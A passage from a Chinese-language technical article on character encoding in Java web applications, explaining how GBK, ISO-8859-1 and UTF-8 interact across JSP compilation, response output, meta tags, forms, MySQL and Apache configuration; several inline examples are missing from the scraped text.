<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　假设文件是</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">gbk</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码保存的，而编译有两种编码选择：</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">gbk</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">或者</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">iso8859-1</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，前者是中文</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">windows</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">的默认编码，后者是</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">linux</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">的默认编码，当然也可以在编译时指定编码。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">Jsp *(gbk:d6d0 cec4) java file *(gbk:d6d0 cec4) compiler read uincode(gbk: 4e2d 6587; iso8859-1: 00d6 00d 000ce 00c4) compiler write utf(gbk: e4b8ad e69687; iso8859-1: *) compiled file unicode(gbk: 4e2d 6587; iso8859-1: 00d6 00d 000ce 00c4) class</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。所以用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">gbk</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码保存，而用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">iso8859-1</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编译的结果是不正确的。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">class unicode(4e2d 6587) system.out / jsp.out gbk(d6d0 cec4) os console / browser</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">l </FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">文件可以以多种编码方式保存，中文</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">windows</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">下，默认为</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">ansi/gbk</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">l </FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编译器读取文件时，需要得到文件的编码，如果未指定，则使用系统默认编码。一般</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">class</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">文件，是以系统默认编码保存的，所以编译不会出问题，但对于</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">jsp</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">文件，如果在中文</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">windows</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">下编辑保存，而部署在英文</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">linux</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">下运行</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">/</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编译，则会出现问题。所以需要在</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">jsp</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">文件中用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">pageEncoding</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">指定编码。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">l Java</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编译的时候会转换成统一的</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">unicode</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码处理，最后保存的时候再转换为</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">utf</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">l </FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">当系统输出字符的时候，会按指定编码输出，对于中文</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">windows</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">下，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">System.out</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">将使用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">gbk</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码，而对于</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">response(</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">浏览器</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">)</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，则使用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">jsp</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">文件头指定的</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">contentType</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，或者可以直接为</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">response</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">指定编码。同时，会告诉</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">browser</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">网页的编码。如果未指定，则会使用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">iso8859-1</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编码。对于中文，应该为</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">browser</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">指定输出字符串的编码。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">l browser</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">显示网页的时候，首先使用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">response</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">中指定的编码</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">(jsp</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">文件头指定的</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">contentType</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">最终也反映在</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">response</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">上</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">)</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，如果未指定，则会使用网页中</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">meta</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">项指定中的</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">contentType</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">3.5. </FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">几处设置</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　对于</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">web</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">应用程序，和编码有关的设置或者函数如下。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">3.5.1. jsp</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">编译</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　指定文件的存储编码，很明显，该设置应该置于文件的开头。例如：。另外，对于一般</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">class</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">文件，可以在编译的时候指定编码。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">3.5.2. jsp</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">输出</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　指定文件输出到</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">browser</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">是使用的编码，该设置也应该置于文件的开头。例如：。该设置和</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">response.setCharacterEncoding("GBK")</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">等效。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">3.5.3. meta</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">设置</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　指定网页使用的编码，该设置对静态网页尤其有作用。因为静态网页无法采用</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">jsp</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">的设置，而且也无法执行</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">response.setCharacterEncoding()</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。例如：</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　如果同时采用了</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">jsp</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">输出和</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">meta</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">设置两种编码指定方式，则</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">jsp</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">指定的优先。因为</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">jsp</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">指定的直接体现在</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">response</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">中。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　需要注意的是，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">apache</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">有一个设置可以给无编码指定的网页指定编码，该指定等同于</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">jsp</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">的编码指定方式，所以会覆盖静态网页中的</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">meta</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">指定。所以有人建议关闭该设置。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">3.5.4. form</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">设置</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　当浏览器提交表单的时候，可以指定相应的编码。例如：</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　。一般不必不使用该设置，浏览器会直接使用网页的编码。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">4. </FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">系统软件</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　下面讨论几个相关的系统软件。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">4.1. mysql</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">数据库</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　很明显，要支持多语言，应该将数据库的编码设置成</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">utf</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">或者</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">unicode</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，而</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">utf</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">更适合与存储。但是，如果中文数据中包含的英文字母很少，其实</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">unicode</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">更为适合。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　数据库的编码可以通过</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">mysql</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">的配置文件设置，例如</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">default-character-set=utf8</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。还可以在数据库链接</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">URL</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">中设置，例如：</SPAN><SPAN lang=EN-US><FONT face="Times New Roman"> useUnicode=true&amp;characterEncoding=UTF-8</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。注意这两者应该保持一致，在新的</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">sql</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">版本里，在数据库链接</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">URL</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">里可以不进行设置，但也不能是错误的设置。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">4.2. apache</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">appache</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">和编码有关的配置在</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">httpd.conf</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">中，例如</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">AddDefaultCharset UTF-8</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">。如前所述，该功能会将所有静态页面的编码设置为</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">UTF-8</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">，最好关闭该功能。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　另外，</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">apache</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">还有单独的模块来处理网页响应头，其中也可能对编码进行设置。</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">　　</SPAN><SPAN lang=EN-US><FONT face="Times New Roman">4.3. linux</FONT></SPAN><SPAN style="FONT-FAMILY: 宋体; mso-ascii-font-family: 'Times New Roman'; mso-hansi-font-family: 'Times New Roman'">默认编码</SPAN></P>
<P style="MARGIN: 0cm 0cm 0pt"><SPAN lang=EN-US><FONT face="Times New Roman">&nbsp;</FONT></SPAN></P>
